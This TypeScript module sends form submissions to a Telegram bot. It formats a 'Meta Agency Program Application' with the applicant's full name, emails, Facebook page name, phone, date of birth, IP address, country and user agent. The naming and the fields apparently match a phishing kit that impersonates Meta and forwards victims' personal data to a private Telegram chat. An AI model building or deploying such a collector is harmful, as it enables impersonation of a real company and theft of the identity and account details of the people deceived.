/**
 * Utility functions for Telegram bot integration
 */

export interface TelegramMessage {
  text: string;
  parse_mode?: 'HTML' | 'Markdown';
}

/**
 * Send a message to Telegram
 */
export async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials not configured');
      console.error('TELEGRAM_BOT_TOKEN:', botToken ? '***exists***' : 'MISSING');
      console.error('TELEGRAM_CHAT_ID:', chatId ? '***exists***' : 'MISSING');
      return false;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error('Telegram API error:', data);
      return false;
    }
    
    console.log('Telegram message sent successfully');
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    if (error instanceof Error) {
      console.error('Error message:', error.message);
      console.error('Error stack:', error.stack);
    }
    return false;
  }
}

/**
 * Format form data as Telegram message
 */
export function formatFormMessage(formData: {
  fullName: string;
  email: string;
  emailBusiness: string;
  pageName: string;
  phoneNumber: string;
  day: string;
  month: string;
  year: string;
  note?: string;
  ip?: string;
  country?: string;
  userAgent?: string;
}): string {
  return `
🔔 <b>New Meta Agency Program Application</b>

👤 <b>Full Name:</b> ${formData.fullName}
📧 <b>Email:</b> ${formData.email}
📧 <b>Business Email:</b> ${formData.emailBusiness}
📄 <b>Page Name:</b> ${formData.pageName}
📱 <b>Phone:</b> ${formData.phoneNumber}
🎂 <b>Date of Birth:</b> ${formData.day}/${formData.month}/${formData.year}
📝 <b>Note:</b> ${formData.note || 'N/A'}

🌍 <b>Location Info:</b>
   IP: ${formData.ip || 'Unknown'}
   Country: ${formData.country || 'Unknown'}
   ${formData.userAgent ? `User Agent: ${formData.userAgent.substring(0, 100)}...` : ''}

⏰ <b>Submitted:</b> ${new Date().toLocaleString()}
  `.trim();
}

